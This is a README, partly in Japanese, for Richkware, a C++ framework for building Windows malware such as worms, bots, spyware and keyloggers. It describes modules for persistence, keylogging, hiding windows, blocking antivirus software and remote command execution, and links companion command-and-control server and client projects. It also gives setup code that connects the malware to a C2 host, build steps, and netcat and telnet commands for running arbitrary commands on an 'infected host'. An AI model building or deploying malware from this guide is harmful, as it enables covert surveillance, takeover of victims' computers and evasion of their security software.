# Richkware

[![Build status](https://ci.appveyor.com/api/projects/status/1tn6vedeaq0v27ra?svg=true)](https://ci.appveyor.com/project/richkmeli/richkware)
[![Codacy Badge](https://api.codacy.com/project/badge/Grade/e6b4a003d5e7404c80225391bfe34f45)](https://app.codacy.com/app/richkmeli/Richkware?utm_source=github.com&utm_medium=referral&utm_content=richkmeli/Richkware&utm_campaign=Badge_Grade_Dashboard)

C++製のWindows向けマルウェア構築のためのフレームワーク。

## 概要

Richkwareは、マルウェアを作成するために役立つライブラリです。
これらの関数を組み合わせることで、以下のようなマルウェアを想定した挙動をすることができます。

- ウイルス
- ワーム
- ボット
- スパイウェア
- キーロガー
- スケアウェア

## 関連プロジェクト

[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server): Richkwareを使用して開発されたマルウェアのサンプルが存在するホストを管理するためのサービスです。

[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client): Richkware-Manager-Serverのクライアントで、サーバーから全ホストのリストを取得し、それらにあらゆる種類のコマンドを送信することができるようになります。

![](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareDiagram1.2.png)

## ドキュメント

|              | 英語                          | イタリア語                     |
|--------------|:------------------------------:|:------------------:|
| 説明 | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/EN/Slide.pdf)  | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/IT/Slide.pdf)     |
| 情報       | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/EN/Report.pdf) | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/IT/Relazione.pdf) |

## 関数

### ネットワーク

- **サーバー** (*network.h*): マルチスレッドサーバを管理するためのモジュールで、特定のプロトコルにしたがってインターネット([Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client) かコンソールを使用) からコマンドを受信できるようにするものです。
    - **プロトコル** (*protocol.h*):
        1. **リモートでのコマンド実行** (ID 1)
        2. (仕掛品)
- **ネットワーク** (*network.h*):
    - **ローリクエスト**: サーバーにリクエストを送信します。
    - **UploadInfoToRichkwareManagerServer**: send information to [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)

### System

- **Storage** (*storage.h*):
    - **SaveSession** and **LoadSession**: save the application state(encrypted) to:
        - **Register** (SaveValueReg and LoadValueReg)
        - **File** (SaveValueToFile and LoadValueFromFile)
    - **Persistence**: install itself permanently in the system.
- **IsAdmin** and **RequestAdminPrivileges** (*richkware.h*): check and require administrator privileges;

- **StealthWindow** (*richkware.h*): hide applications;
- **OpenApp** (*richkware.h*): open arbitrary applications;
- **Keylogger** (*richkware.h*): stores in a file all pressed keys;
 - **BlockApps** e **UnBlockApps** (*blockApps.h*): block and unblock applications (antivirus, ...).

### Cryptography

- **Encrypt and Decrypt** (*crypto.h*): [RC4](https://en.wikipedia.org/wiki/RC4) (default), [Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher)).
- **Encode and Decode** (*crypto.h*): [Base64](https://en.wikipedia.org/wiki/Base64) (defualt), [Hex](https://en.wikipedia.org/wiki/Hexadecimal#Transfer_encoding).

![](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareCryptographyDiagram1.1.png)

### Other

- **RandMouse** (*richkware.h*): move randomly the mouse cursor;
- **Hibernation** (*richkware.h*): hibernate system.

## Requirements
These are the base requirements to build and use Richkware:

- Make or CMake
- [MinGW](http://www.mingw.org/)

## Get Started
Open main.cpp, and create an instance of Richkware.
### With [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)
If you have deployed [RMS](https://github.com/richkmeli/Richkware-Manager-Server), you can initialize the malware as follows:

        int main() {
               Richkware richkware("Richk","DefaultPassword","192.168.99.100", "8080", "associatedUser");
                ...
                return 0;
            }
        
that it gets a secure key from Richkware-Manager-Server and it sets the key as encryption key.
**DefaultPass** is used as temporary encryption key to ensure a secure communication with RMS and if the malware cannot reach the RMS for getting its encryption ket, it will use DefaultPass as encryption key.


### Without [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)

Otherwise, if you haven't deployed [RMS](https://github.com/richkmeli/Richkware-Manager-Server), you can use: 
         
     Richkware richkware("Richk","richktest");
         
 in this way, it uses "richktest" as encryption key.
     


## Compile

After **main.cpp** implementation, you can compile as follows.

### Using MinGW for Windows or MinGW cross compiler for Linux build environment

	make

### Using Microsoft C++ compiler (Visual Studio)
- C/C++ > Preprocessor > Preprocessor Definitions, add "\_CRT\_SECURE\_NO\_WARNINGS" 
- Linker > Input > Additional Dependencies, add "Ws2_32.lib"

## Examples of usage
In the following example, we call "**server**", a malware developed using Richkware framework and in which it has been enabled the function for creating a server, and "**client**", the creator(Hacker) of the malware that is trying to establish a connection with the infected PC.

### Server-side

#### Remotely Command Execution

Call framework function **StartServer** in the main, it starts server on a port, in the following example is the TCP port 8000. Remember that if a port is already used by another program, you can't use that port, until the program will be stopped.

	int main () {
	    ...
		richkware.network.server.Start("8000");
        ...
	}

### Client-side

#### Connect using [Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)
In all systems where the Java Virtual Machine is installed, you can use [Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client), otherwise if it's not present you can easily use a terminal.

#### Connect using terminal in Unix systems

In Unix systems, you can use **netcat**, and run the following command:

	nc <serverName> 8000
	
if the server received the request on the open port and it succeeds to create a connection, it responses to the client confirming the establishment of the connection, after that, you can write:
    
    [[1]]COMMAND
    
where *COMMAND* is a command that has to be executed on the infected host where server is running.

#### Connect using terminal in Windows

In Windows, you can use **telnet**, in the same way:

	telnet <serverName> 8000

...
    
    [[1]]COMMAND
    
